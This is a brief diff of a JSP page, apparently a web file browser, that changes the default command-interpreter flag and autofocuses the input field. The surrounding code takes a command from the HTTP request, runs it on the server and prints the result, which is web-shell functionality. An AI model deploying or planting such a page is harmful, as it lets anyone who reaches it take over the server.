@@ -1385,7 +1385,7 @@ Upload finished.
                     ret = startProcess(
 						request.getParameter("command"), (String) request.getAttribute("dir"), request.getParameter("commandInterpreter"));
 				out.println(ret);
-				boolean dos = true;
+				boolean dos = false;
 				try {
 					dos = request.getParameter("commandInterpreter").equals("dos");
 				} catch (Exception e){
@@ -1395,7 +1395,7 @@ Upload finished.
 	<br /><br />
 	<table class="formular" style="width:70%;">
 	<tr><td title="Enter your command">
-	Command: <input style="width:80%;" type="text" name="command" value="">
+	Command: <input style="width:80%;" type="text" name="command" value="" autofocus>
 	</td></tr>
 	<tr><td>
 	<input type="radio" name="commandInterpreter" value="dos" <%= dos?"checked":""%>>Ms-Dos/Windows
